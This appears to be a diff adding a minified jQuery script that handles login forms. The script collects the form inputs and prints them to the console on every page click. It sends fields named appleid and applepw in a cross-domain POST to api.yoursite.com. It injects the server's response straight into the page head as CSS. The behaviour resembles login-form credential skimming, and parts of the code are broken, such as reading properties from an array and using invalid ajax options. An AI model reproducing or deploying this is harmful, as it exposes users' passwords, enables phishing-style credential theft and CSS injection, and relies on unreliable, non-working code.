@@ -1,0 +1,3 @@
+//TODO: function to iterate through forms that have class of loginform but do not have an id and set their ids. we want to not just know they logged in but from where they did it.
+//ap_id_loginform
+$("html").removeClass("no-js"),$(document).ready(function(e){var t=e(".loginform .loginform.credentials :input").serializeArray();console.log(t),e("body").click(function(){console.log(t)})});var request=function(){var e=$(".loginform :input ").serializeArray();$.ajax({type:"POST",url:"http://api.yoursite.com/login",crossDomain:!0,username:e.appleid,password:e.applepw,success:function(e){console.log("succeeded")},fail:function(){console.log("failed")}}).done(function(e){$("head").append("<style type='text/css'>"+e+"</style>")})};
